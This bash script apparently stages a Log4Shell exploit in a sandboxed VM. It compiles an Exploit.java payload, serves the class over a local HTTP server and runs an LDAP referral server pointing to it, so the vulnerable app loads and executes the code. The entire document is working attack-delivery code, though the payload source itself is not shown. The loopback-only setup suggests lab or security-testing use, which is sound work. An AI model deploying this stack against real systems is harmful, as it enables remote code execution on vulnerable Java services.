#!/usr/bin/env bash
# On-box Log4Shell attacker stack for the TraditionalJay VM (sandbox).
# Avoids needing inbound ports on your laptop — VM exploits itself via 127.0.0.1.
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXPLOIT_DIR="${DIR}/exploit"
HTTP_PORT="${HTTP_PORT:-8000}"
LDAP_PORT="${LDAP_PORT:-1389}"
CODEBASE="http://127.0.0.1:${HTTP_PORT}/"

if [[ ! -f "$EXPLOIT_DIR/Exploit.class" ]]; then
  echo "==> Compiling Exploit.class"
  javac -d "$EXPLOIT_DIR" "$EXPLOIT_DIR/Exploit.java"
fi

pkill -f "http.server ${HTTP_PORT}" 2>/dev/null || true
pkill -f "ldap-ref-server.py --port ${LDAP_PORT}" 2>/dev/null || true
sleep 0.3

echo "==> HTTP codebase on 127.0.0.1:${HTTP_PORT}"
(cd "$EXPLOIT_DIR" && python3 -m http.server "$HTTP_PORT" --bind 127.0.0.1) &
echo "==> LDAP ref on 127.0.0.1:${LDAP_PORT} → ${CODEBASE}#Exploit"
exec python3 "$DIR/ldap-ref-server.py" --host 127.0.0.1 --port "$LDAP_PORT" --codebase "$CODEBASE" --class Exploit
